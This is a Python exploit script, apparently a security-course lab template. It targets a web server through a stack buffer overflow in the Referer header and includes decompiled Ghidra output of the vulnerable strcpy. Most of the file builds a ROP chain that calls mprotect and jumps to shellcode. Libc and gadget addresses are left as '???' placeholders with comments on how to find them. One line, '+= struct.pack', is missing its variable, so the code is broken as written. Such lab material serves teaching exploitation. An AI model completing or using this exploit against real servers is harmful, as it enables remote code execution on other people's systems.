#!/usr/bin/python3

from socket import *
import struct
import sys
import urllib.request, urllib.parse, urllib.error

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = ""
with open("exploit64", "rb") as fh:
    exploit = fh.read() 	# exploit is 150 bytes

base = ???			# base of libc found using: `cat /proc/<pid of webserver_lab10>/maps/ 
mprotect_addr = ??? + base  	# found using: `readelf -s /usr/lib64/libc-2.29.so | grep mprotect`
pop_rdi_addr = ??? + base	# gadget offset (pop rdi; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so` 
pop_rsi_addr = ??? + base  	# gadget offset (pop rsi; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so` 
pop_rdx_addr = ??? + base   	# gadget offset (pop rdx; ret) found with `ROPgadget --binary /usr/lib64/libc-2.29.so` 
decode_addr = ???		# (after previous call to strcpy()) - address of custom function that calls sscanf() to decode 
shell_addr = ???		# address of shellcode within the 41414000 page boundary (that mprotect will modify)
shell_page = ???		# found at the mmap() within Ghidra
size_arg = ???			# size to make executable
prot_arg = ???		    	# value of PROT_READ | PROT_WRITE | PROT_EXEC

'''
# Vulernable Header w/in Ghidra
undefined8 FUN_0040220b(uint uParm1,char **ppcParm2)

{
  int iVar1;
  long lVar2;
  
  iVar1 = strcmp(ppcParm2[2],"HTCPCP");
  if (iVar1 == 0) {
    FUN_00401801((ulong)uParm1,"HTCPCP/1.0",0x1a2,"I\'m a teapot",ppcParm2);
  }
  else {
    iVar1 = strcmp(*ppcParm2,"POST");
    if (((iVar1 != 0) && (iVar1 = strcmp(*ppcParm2,"GET"), iVar1 != 0)) &&
       (iVar1 = strcmp(*ppcParm2,"HEAD"), iVar1 != 0)) {
      FUN_00401801((ulong)uParm1,"HTTP/1.1",0x195,"Method Not Allowed",ppcParm2);
      return 1;
    }
    lVar2 = FUN_004017ab(ppcParm2,"Referer");
    if (lVar2 != 0) {
      FUN_004021ca(lVar2);
    }
    FUN_00401801((ulong)uParm1,"HTTP/1.0",0x194,"Not Found",ppcParm2);
  }
  return 1;
}

# Vulnerable strcpy() w/in FUN_004021ca
undefined8 FUN_004021ca(char *pcParm1)  
{
  char local_288 [640];
  strcpy(local_288,pcParm1);
  FUN_00401dd6(local_288); <- What is this??
  return 1;
}
'''

# METHOD/HEADER
msg = b'GET /asdf.vbs HTTP/1.1\r\n'
msg += b'Referer:'			

# EXPLOIT
x = exploit
x += b'A' * 490		    		# fill up the rest of the 640 byte buffer
x += b'\xFF'* 8		    		# RBP

# ROP CHAIN
x += struct.pack("<Q", pop_rdi_addr)  	
x += struct.pack("<Q", shell_page)    	
x += struct.pack("<Q", pop_rsi_addr)	 
x += struct.pack("<Q", size_arg)        
x += struct.pack("<Q", pop_rdx_addr)	
 += struct.pack("<Q", prot_arg)       
x += struct.pack("<Q", mprotect_addr)   
x += struct.pack("<Q", pop_rdi_addr)    
x += struct.pack("<Q", shell_addr)       
x += struct.pack("<Q", decode_addr)	
x += struct.pack("<Q", shell_addr)	

msg += urllib.parse.quote(x).encode()	# do some research on urllib.parse.quote to see what is going on here

msg += b'\r\n\r\n'

s.send(msg)
